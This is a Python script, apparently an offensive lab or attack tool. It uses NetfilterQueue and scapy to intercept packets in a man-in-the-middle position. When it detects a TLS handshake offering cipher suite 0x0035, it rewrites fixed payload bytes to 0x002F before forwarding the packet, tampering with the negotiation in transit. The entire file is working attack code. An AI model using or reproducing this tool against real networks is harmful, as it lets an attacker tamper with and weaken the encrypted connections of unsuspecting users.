#!/usr/bin/env python3
import sys
import re
from netfilterqueue import NetfilterQueue
from scapy.all import *

nf_queue_id = 0
max_packets = 100


# called each time a packet is put in the queue
def packetReceived(pkt):
    sys.stdout.write(".")
    sys.stdout.flush()

    try:
        ip = IP(pkt.get_payload())
        if ip.haslayer("Raw"):
            tcp_payload = ip["Raw"].load
            if (
                tcp_payload[0] == 0x16
                and tcp_payload[1] == 0x03
                and tcp_payload[46] == 0x00
                and tcp_payload[47] == 0x35
            ):

                print("Jackpot! Handshake found, editing bytes...")

                msg_bytes = bytearray(pkt.get_payload())
                msg_bytes[112] = 0x00
                msg_bytes[113] = 0x2F
                pkt.set_payload(bytes(msg_bytes))
    except:
        pass

    pkt.accept()
    return


print("Binding to NFQUEUE", nf_queue_id)
nfqueue = NetfilterQueue()
nfqueue.bind(nf_queue_id, packetReceived, max_packets)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Listener killed.")

nfqueue.unbind()
